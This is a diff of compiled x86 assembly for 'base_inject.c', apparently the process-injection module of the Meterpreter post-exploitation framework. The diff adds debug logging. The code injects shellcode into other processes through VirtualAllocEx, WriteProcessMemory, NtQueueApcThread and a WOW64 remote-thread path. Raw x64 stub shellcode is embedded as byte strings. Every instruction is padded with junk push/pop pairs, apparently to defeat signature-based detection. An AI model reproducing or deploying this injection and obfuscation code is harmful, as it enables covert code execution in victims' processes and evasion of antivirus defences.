@@ -1,5 +1,175 @@
 	.file	"base_inject.c"
 	.text
+	.section .rdata,"dr"
+LC0:
+	.ascii "[%04x] \0"
+LC1:
+	.ascii "\15\12\0"
+	.text
+	.def	_real_dprintf;	.scl	3;	.type	32;	.endef
+_real_dprintf:
+	pushl	%ebp
+push %eax
+pop %eax
+	movl	%esp, %ebp
+push %eax
+pop %eax
+	pushl	%esi
+push %eax
+pop %eax
+	pushl	%ebx
+push %eax
+pop %eax
+	subl	$1072, %esp
+push %eax
+pop %eax
+	movl	__imp__GetCurrentThreadId@0, %eax
+push %eax
+pop %eax
+	call	*%eax
+push %eax
+pop %eax
+	movl	%eax, 16(%esp)
+push %eax
+pop %eax
+	movl	$LC0, 12(%esp)
+push %eax
+pop %eax
+	movl	$1023, 8(%esp)
+push %eax
+pop %eax
+	movl	$1024, 4(%esp)
+push %eax
+pop %eax
+	leal	-1040(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, (%esp)
+push %eax
+pop %eax
+	movl	__imp___snprintf_s, %eax
+push %eax
+pop %eax
+	call	*%eax
+push %eax
+pop %eax
+	leal	-1040(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, (%esp)
+push %eax
+pop %eax
+	call	_strlen
+push %eax
+pop %eax
+	movl	%eax, -12(%ebp)
+push %eax
+pop %eax
+	leal	12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, -16(%ebp)
+push %eax
+pop %eax
+	movl	-16(%ebp), %ecx
+push %eax
+pop %eax
+	movl	$1021, %eax
+push %eax
+pop %eax
+	subl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, %edx
+push %eax
+pop %eax
+	movl	$1024, %eax
+push %eax
+pop %eax
+	subl	-12(%ebp), %eax
+push %eax
+pop %eax
+	leal	-1040(%ebp), %esi
+push %eax
+pop %eax
+	movl	-12(%ebp), %ebx
+push %eax
+pop %eax
+	addl	%esi, %ebx
+push %eax
+pop %eax
+	movl	%ecx, 16(%esp)
+push %eax
+pop %eax
+	movl	8(%ebp), %ecx
+push %eax
+pop %eax
+	movl	%ecx, 12(%esp)
+push %eax
+pop %eax
+	movl	%edx, 8(%esp)
+push %eax
+pop %eax
+	movl	%eax, 4(%esp)
+push %eax
+pop %eax
+	movl	%ebx, (%esp)
+push %eax
+pop %eax
+	call	_vsnprintf_s
+push %eax
+pop %eax
+	movl	$LC1, 8(%esp)
+push %eax
+pop %eax
+	movl	$1024, 4(%esp)
+push %eax
+pop %eax
+	leal	-1040(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, (%esp)
+push %eax
+pop %eax
+	movl	__imp__strcat_s, %eax
+push %eax
+pop %eax
+	call	*%eax
+push %eax
+pop %eax
+	leal	-1040(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, (%esp)
+push %eax
+pop %eax
+	movl	__imp__OutputDebugStringA@4, %eax
+push %eax
+pop %eax
+	call	*%eax
+push %eax
+pop %eax
+	subl	$4, %esp
+push %eax
+pop %eax
+	nop
+push %eax
+pop %eax
+	leal	-8(%ebp), %esp
+push %eax
+pop %eax
+	popl	%ebx
+push %eax
+pop %eax
+	popl	%esi
+push %eax
+pop %eax
+	popl	%ebp
+push %eax
+pop %eax
+	ret
+push %eax
+pop %eax
 	.globl	_migrate_executex64
 	.data
 	.align 32
@@ -35,10 +205,65 @@ _apc_stub_x64:
 	.ascii "8\340u\361L\3L$\10E9\321u\330XD\213@$I\1\320fA\213\14HD\213@\34I\1\320A\213\4\210H\1\320AXAX^YZAXAYAZH\203\354 AR\377\340XAYZH\213\22\351O\377\377\377]H1\322eH\213B0H9\220\310\2\0\0u\16H\215\225\7\1\0\0H\211\220\310\2\0\0L\213\1L\213I\10H1\311H1\322QQA\272"
 	.ascii "8h\15\26\377\325H\201\304\250\0\0\0\303\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
 	.section .rdata,"dr"
-LC0:
+	.align 4
+LC2:
+	.ascii "[INJECT] inject_via_apcthread: VirtualAllocEx 0x6B0095F0 failed\0"
+LC3:
+	.ascii "%s. error=%d (0x%x)\0"
+	.align 4
+LC4:
+	.ascii "[INJECT] inject_via_apcthread: VirtualQueryEx failed\0"
+	.align 4
+LC5:
+	.ascii "[INJECT] inject_via_apcthread: malloc lpNopSled failed\0"
+	.align 4
+LC6:
+	.ascii "[INJECT] inject_via_apcthread: WriteProcessMemory lpNopSled failed\0"
+	.align 4
+LC7:
+	.ascii "[INJECT] inject_via_apcthread: WriteProcessMemory bStub failed\0"
+	.align 4
+LC8:
+	.ascii "[INJECT] inject_via_apcthread: Invalid target architecture\0"
+LC9:
 	.ascii "ntdll\0"
-LC1:
+	.align 4
+LC10:
+	.ascii "[INJECT] inject_via_apcthread: LoadLibraryA failed\0"
+LC11:
 	.ascii "NtQueueApcThread\0"
+	.align 4
+LC12:
+	.ascii "[INJECT] inject_via_apcthread: GetProcAddress NtQueueApcThread failed\0"
+	.align 4
+LC13:
+	.ascii "[INJECT] inject_via_apcthread: CreateToolhelp32Snapshot failed\0"
+	.align 4
+LC14:
+	.ascii "[INJECT] inject_via_apcthread: Thread32First failed\0"
+	.align 4
+LC15:
+	.ascii "[INJECT] inject_via_apcthread: VirtualAllocEx failed\0"
+LC16:
+	.ascii "x86\0"
+	.align 4
+LC17:
+	.ascii "[INJECT] -- dwMeterpreterArch=%s, lpRemoteApcStub=0x%08X, lpRemoteApcContext=0x%08X\0"
+	.align 4
+LC18:
+	.ascii "[INJECT] inject_via_apcthread: WriteProcessMemory lpRemoteApcStub failed\0"
+	.align 4
+LC19:
+	.ascii "[INJECT] inject_via_apcthread: WriteProcessMemory lpRemoteApcContext failed\0"
+	.align 4
+LC20:
+	.ascii "[INJECT] inject_via_apcthread: Trying to inject into thread %d\0"
+	.align 4
+LC21:
+	.ascii "[INJECT] inject_via_apcthread: pNtQueueApcThread for thread %d Succeeded.\0"
+	.align 4
+LC22:
+	.ascii "[INJECT] inject_via_apcthread: pNtQueueApcThread for thread %d Failed.\0"
 	.text
 	.globl	_inject_via_apcthread
 	.def	_inject_via_apcthread;	.scl	2;	.type	32;	.endef
@@ -91,7 +316,7 @@ pop %eax
 	movl	$0, %eax
 push %eax
 pop %eax
-L2:
+L3:
 	movl	%ecx, -88(%ebp,%eax)
 push %eax
 pop %eax
@@ -101,7 +326,7 @@ pop %eax
 	cmpl	%edx, %eax
 push %eax
 pop %eax
-	jb	L2
+	jb	L3
 push %eax
 pop %eax
 	movl	$0, -108(%ebp)
@@ -131,7 +356,7 @@ pop %eax
 	cmpl	$0, -44(%ebp)
 push %eax
 pop %eax
-	je	L37
+	je	L39
 push %eax
 pop %eax
 	movl	28(%ebp), %eax
@@ -155,7 +380,7 @@ pop %eax
 	cmpl	$1, 24(%ebp)
 push %eax
 pop %eax
-	jne	L6
+	jne	L7
 push %eax
 pop %eax
 	movl	$_apc_stub_x86, -24(%ebp)
@@ -164,14 +389,14 @@ pop %eax
 	movl	$245, -28(%ebp)
 push %eax
 pop %eax
-	jmp	L7
+	jmp	L8
 push %eax
 pop %eax
-L6:
+L7:
 	cmpl	$2, 24(%ebp)
 push %eax
 pop %eax
-	jne	L8
+	jne	L9
 push %eax
 pop %eax
 	movl	$_apc_stub_x64, -24(%ebp)
@@ -195,7 +420,7 @@ pop %eax
 	movl	$0, %eax
 push %eax
 pop %eax
-L9:
+L10:
 	movl	%ecx, -136(%ebp,%eax)
 push %eax
 pop %eax
@@ -205,7 +430,7 @@ pop %eax
 	cmpl	%edx, %eax
 push %eax
 pop %eax
-	jb	L9
+	jb	L10
 push %eax
 pop %eax
 	movl	$0, -48(%ebp)
@@ -262,7 +487,7 @@ pop %eax
 	cmpl	$0, -48(%ebp)
 push %eax
 pop %eax
-	jne	L11
+	jne	L12
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -274,10 +499,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L5
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L11:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC2, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L6
+push %eax
+pop %eax
+L12:
 	movl	$28, 12(%esp)
 push %eax
 pop %eax
@@ -311,7 +557,7 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	jne	L13
+	jne	L14
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -323,10 +569,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L5
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L13:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC4, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L6
+push %eax
+pop %eax
+L14:
 	movl	-124(%ebp), %eax
 push %eax
 pop %eax
@@ -342,7 +609,7 @@ pop %eax
 	cmpl	$0, -52(%ebp)
 push %eax
 pop %eax
-	jne	L14
+	jne	L15
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -354,10 +621,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L5
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L14:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC5, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L6
+push %eax
+pop %eax
+L15:
 	movl	-124(%ebp), %eax
 push %eax
 pop %eax
@@ -415,7 +703,7 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	jne	L15
+	jne	L16
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -427,10 +715,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L5
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L15:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC6, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L6
+push %eax
+pop %eax
+L16:
 	movl	-124(%ebp), %eax
 push %eax
 pop %eax
@@ -476,7 +785,7 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	jne	L16
+	jne	L17
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -488,10 +797,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L5
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L16:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC7, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L6
+push %eax
+pop %eax
+L17:
 	movl	-52(%ebp), %eax
 push %eax
 pop %eax
@@ -501,10 +831,10 @@ pop %eax
 	call	_free
 push %eax
 pop %eax
-	jmp	L7
+	jmp	L8
 push %eax
 pop %eax
-L8:
+L9:
 	movl	$10, (%esp)
 push %eax
 pop %eax
@@ -526,11 +856,32 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L5
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L7:
-	movl	$LC0, (%esp)
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC8, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L6
+push %eax
+pop %eax
+L8:
+	movl	$LC9, (%esp)
 push %eax
 pop %eax
 	movl	__imp__LoadLibraryA@4, %eax
@@ -548,7 +899,7 @@ pop %eax
 	cmpl	$0, -16(%ebp)
 push %eax
 pop %eax
-	jne	L17
+	jne	L18
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -560,11 +911,32 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L5
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L17:
-	movl	$LC1, 4(%esp)
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC10, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L6
+push %eax
+pop %eax
+L18:
+	movl	$LC11, 4(%esp)
 push %eax
 pop %eax
 	movl	-16(%ebp), %eax
@@ -588,7 +960,7 @@ pop %eax
 	cmpl	$0, -32(%ebp)
 push %eax
 pop %eax
-	jne	L18
+	jne	L19
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -600,10 +972,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L5
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L18:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC12, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L6
+push %eax
+pop %eax
+L19:
 	movl	$0, 4(%esp)
 push %eax
 pop %eax
@@ -622,7 +1015,7 @@ pop %eax
 	cmpl	$0, -20(%ebp)
 push %eax
 pop %eax
-	jne	L19
+	jne	L20
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -634,10 +1027,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L5
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L19:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC13, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L6
+push %eax
+pop %eax
+L20:
 	leal	-88(%ebp), %eax
 push %eax
 pop %eax
@@ -659,7 +1073,7 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	jne	L20
+	jne	L21
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -671,10 +1085,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L5
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L20:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC14, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L6
+push %eax
+pop %eax
+L21:
 	movl	-28(%ebp), %eax
 push %eax
 pop %eax
@@ -714,7 +1149,7 @@ pop %eax
 	cmpl	$0, -36(%ebp)
 push %eax
 pop %eax
-	jne	L21
+	jne	L22
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -726,10 +1161,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L5
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L21:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC15, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L6
+push %eax
+pop %eax
+L22:
 	movl	-36(%ebp), %edx
 push %eax
 pop %eax
@@ -740,6 +1196,27 @@ pop %eax
 push %eax
 pop %eax
 	movl	%eax, -40(%ebp)
+push %eax
+pop %eax
+	movl	-40(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-36(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC16, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC17, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
 push %eax
 pop %eax
 	movl	$0, 16(%esp)
@@ -781,7 +1258,7 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	jne	L22
+	jne	L23
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -793,10 +1270,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L5
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L22:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC18, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L6
+push %eax
+pop %eax
+L23:
 	movl	$0, 16(%esp)
 push %eax
 pop %eax
@@ -833,7 +1331,7 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	jne	L23
+	jne	L24
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -845,10 +1343,31 @@ pop %eax
 	movl	%eax, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L5
+	movl	-12(%ebp), %eax
 push %eax
 pop %eax
-L23:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-12(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC19, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L6
+push %eax
+pop %eax
+L24:
 	movl	$0, -56(%ebp)
 push %eax
 pop %eax
@@ -858,7 +1377,7 @@ pop %eax
 	cmpl	%eax, 20(%ebp)
 push %eax
 pop %eax
-	jne	L38
+	jne	L40
 push %eax
 pop %eax
 	movl	-80(%ebp), %eax
@@ -888,7 +1407,19 @@ pop %eax
 	cmpl	$0, -56(%ebp)
 push %eax
 pop %eax
-	je	L39
+	je	L41
+push %eax
+pop %eax
+	movl	-80(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC20, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
 push %eax
 pop %eax
 	movl	-56(%ebp), %eax
@@ -909,7 +1440,7 @@ pop %eax
 	cmpl	$-1, %eax
 push %eax
 pop %eax
-	je	L27
+	je	L28
 push %eax
 pop %eax
 	movl	-56(%ebp), %eax
@@ -963,16 +1494,44 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	jne	L25
+	jne	L29
+push %eax
+pop %eax
+	movl	-80(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC21, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
 push %eax
 pop %eax
 	movl	$0, -12(%ebp)
 push %eax
 pop %eax
-	jmp	L25
+	jmp	L26
 push %eax
 pop %eax
-L27:
+L29:
+	movl	-80(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC22, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L26
+push %eax
+pop %eax
+L28:
 	movl	-56(%ebp), %eax
 push %eax
 pop %eax
@@ -988,21 +1547,21 @@ pop %eax
 	subl	$4, %esp
 push %eax
 pop %eax
-	jmp	L25
+	jmp	L26
 push %eax
 pop %eax
-L38:
+L40:
 	nop
 push %eax
 pop %eax
-	jmp	L25
+	jmp	L26
 push %eax
 pop %eax
-L39:
+L41:
 	nop
 push %eax
 pop %eax
-L25:
+L26:
 	leal	-88(%ebp), %eax
 push %eax
 pop %eax
@@ -1024,33 +1583,33 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	jne	L23
+	jne	L24
 push %eax
 pop %eax
-	jmp	L5
+	jmp	L6
 push %eax
 pop %eax
-L37:
+L39:
 	nop
 push %eax
 pop %eax
-L5:
+L6:
 	cmpl	$0, -12(%ebp)
 push %eax
 pop %eax
-	jne	L28
+	jne	L30
 push %eax
 pop %eax
 	cmpl	$0, 8(%ebp)
 push %eax
 pop %eax
-	je	L28
+	je	L30
 push %eax
 pop %eax
 	cmpl	$0, 12(%ebp)
 push %eax
 pop %eax
-	je	L28
+	je	L30
 push %eax
 pop %eax
 	movl	$2, 8(%esp)
@@ -1098,14 +1657,14 @@ pop %eax
 	subl	$4, %esp
 push %eax
 pop %eax
-L28:
+L30:
 	cmpl	$0, -44(%ebp)
 push %eax
 pop %eax
-	je	L29
+	je	L31
 push %eax
 pop %eax
-L32:
+L34:
 	movl	-44(%ebp), %eax
 push %eax
 pop %eax
@@ -1121,7 +1680,7 @@ pop %eax
 	cmpl	$0, -60(%ebp)
 push %eax
 pop %eax
-	je	L40
+	je	L42
 push %eax
 pop %eax
 	movl	-60(%ebp), %eax
@@ -1154,10 +1713,10 @@ pop %eax
 	subl	$4, %esp
 push %eax
 pop %eax
-	jmp	L32
+	jmp	L34
 push %eax
 pop %eax
-L40:
+L42:
 	nop
 push %eax
 pop %eax
@@ -1170,11 +1729,11 @@ pop %eax
 	call	_list_destroy
 push %eax
 pop %eax
-L29:
+L31:
 	cmpl	$0, -20(%ebp)
 push %eax
 pop %eax
-	je	L33
+	je	L35
 push %eax
 pop %eax
 	movl	-20(%ebp), %eax
@@ -1192,11 +1751,11 @@ pop %eax
 	subl	$4, %esp
 push %eax
 pop %eax
-L33:
+L35:
 	cmpl	$0, -16(%ebp)
 push %eax
 pop %eax
-	je	L34
+	je	L36
 push %eax
 pop %eax
 	movl	-16(%ebp), %eax
@@ -1214,7 +1773,7 @@ pop %eax
 	subl	$4, %esp
 push %eax
 pop %eax
-L34:
+L36:
 	movl	-12(%ebp), %eax
 push %eax
 pop %eax
@@ -1239,6 +1798,32 @@ pop %eax
 	ret
 push %eax
 pop %eax
+	.section .rdata,"dr"
+	.align 4
+LC23:
+	.ascii "[INJECT] inject_via_remotethread_wow64: GetVersionEx failed\0"
+	.align 4
+LC24:
+	.ascii "[INJECT] inject_via_remotethread_wow64: Windows 2003 not supported.\0"
+	.align 4
+LC25:
+	.ascii "[INJECT] inject_via_remotethread_wow64: VirtualAlloc pExecuteX64 failed\0"
+	.align 4
+LC26:
+	.ascii "[INJECT] inject_via_remotethread_wow64: VirtualAlloc pX64function failed\0"
+	.align 4
+LC27:
+	.ascii "[INJECT] inject_via_remotethread_wow64: pExecuteX64=0x%08X, pX64function=0x%08X, ctx=0x%08X\0"
+	.align 4
+LC28:
+	.ascii "[INJECT] inject_via_remotethread_wow64: pExecuteX64( pX64function, ctx ) failed\0"
+	.align 4
+LC29:
+	.ascii "[INJECT] inject_via_remotethread_wow64: ctx->t.hThread is NULL\0"
+	.align 4
+LC30:
+	.ascii "[INJECT] inject_via_remotethread_wow64: Success, hThread=0x%08X\0"
+	.text
 	.globl	_inject_via_remotethread_wow64
 	.def	_inject_via_remotethread_wow64;	.scl	2;	.type	32;	.endef
 _inject_via_remotethread_wow64:
@@ -1308,7 +1893,7 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	jne	L42
+	jne	L44
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -1320,17 +1905,38 @@ pop %eax
 	movl	%eax, -28(%ebp)
 push %eax
 pop %eax
-	jmp	L43
+	movl	-28(%ebp), %eax
 push %eax
 pop %eax
-L42:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-28(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC23, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L45
+push %eax
+pop %eax
+L44:
 	movl	-184(%ebp), %eax
 push %eax
 pop %eax
 	cmpl	$5, %eax
 push %eax
 pop %eax
-	jne	L44
+	jne	L46
 push %eax
 pop %eax
 	movl	-180(%ebp), %eax
@@ -1339,7 +1945,7 @@ pop %eax
 	cmpl	$2, %eax
 push %eax
 pop %eax
-	jne	L44
+	jne	L46
 push %eax
 pop %eax
 	movl	$5, (%esp)
@@ -1363,10 +1969,31 @@ pop %eax
 	movl	%eax, -28(%ebp)
 push %eax
 pop %eax
-	jmp	L43
+	movl	-28(%ebp), %eax
 push %eax
 pop %eax
-L44:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-28(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC24, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L45
+push %eax
+pop %eax
+L46:
 	movl	$64, 12(%esp)
 push %eax
 pop %eax
@@ -1394,7 +2021,7 @@ pop %eax
 	cmpl	$0, -32(%ebp)
 push %eax
 pop %eax
-	jne	L45
+	jne	L47
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -1406,10 +2033,31 @@ pop %eax
 	movl	%eax, -28(%ebp)
 push %eax
 pop %eax
-	jmp	L43
+	movl	-28(%ebp), %eax
 push %eax
 pop %eax
-L45:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-28(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC25, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L45
+push %eax
+pop %eax
+L47:
 	movl	$64, 12(%esp)
 push %eax
 pop %eax
@@ -1437,7 +2085,7 @@ pop %eax
 	cmpl	$0, -36(%ebp)
 push %eax
 pop %eax
-	jne	L46
+	jne	L48
 push %eax
 pop %eax
 	movl	__imp__GetLastError@0, %eax
@@ -1449,10 +2097,31 @@ pop %eax
 	movl	%eax, -28(%ebp)
 push %eax
 pop %eax
-	jmp	L43
+	movl	-28(%ebp), %eax
 push %eax
 pop %eax
-L46:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-28(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	$LC26, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC3, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	jmp	L45
+push %eax
+pop %eax
+L48:
 	movl	-32(%ebp), %eax
 push %eax
 pop %eax
@@ -1606,6 +2275,30 @@ pop %eax
 	movl	-40(%ebp), %eax
 push %eax
 pop %eax
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-36(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
+pop %eax
+	movl	-32(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 4(%esp)
+push %eax
+pop %eax
+	movl	$LC27, (%esp)
+push %eax
+pop %eax
+	call	_real_dprintf
+push %eax
+pop %eax
+	movl	-40(%ebp), %eax
+push %eax
+pop %eax
 	movl	%eax, 4(%esp)
 push %eax
 pop %eax
@@ -1627,7 +2320,7 @@ pop %eax
 	testl	%eax, %eax
 push %eax
 pop %eax
-	jne	L47
+	jne	L49
 push %eax
 pop %eax
 	movl	$5, (%esp)
@@ -1651,10 +2344,31 @@ pop %eax
 	movl	%eax, -28(%ebp)
 push %eax
 pop %eax
-	jmp	L43
+	movl	-28(%ebp), %eax
 push %eax
 pop %eax
-L47:
+	movl	%eax, 12(%esp)
+push %eax
+pop %eax
+	movl	-28(%ebp), %eax
+push %eax
+pop %eax
+	movl	%eax, 8(%esp)
+push %eax
